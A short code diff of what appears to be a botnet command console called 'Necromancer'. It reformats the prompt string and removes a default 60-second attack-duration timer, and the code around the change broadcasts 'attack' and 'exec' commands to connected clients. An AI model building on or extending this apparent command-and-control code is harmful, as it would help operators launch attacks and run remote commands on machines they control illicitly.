@@ -10,7 +10,7 @@ const rl = readline.createInterface({
 let fileNum = 0;
 
 export function prompt() {
-	rl.question("\x1b[31m[NECROMANCER]\x1b[0m ", (message) => {
+	rl.question(`\x1b[31m[Necromancer]\x1b[0m `, (message) => {
 		message = message.toLowerCase();
 
 		const commandArgs = {
@@ -102,16 +102,6 @@ export function prompt() {
 				broadcast(message);
 				console.log(`Attack sent!`);
 			}
-
-			let duration = commandArgs.third;
-
-			if (commandArgs.third === undefined) {
-				duration = 60000;
-			}
-
-			setTimeout(() => {
-				console.log("Attack completed!");
-			}, duration);
 		}
 
 		if (message.startsWith("exec")) broadcast(message);
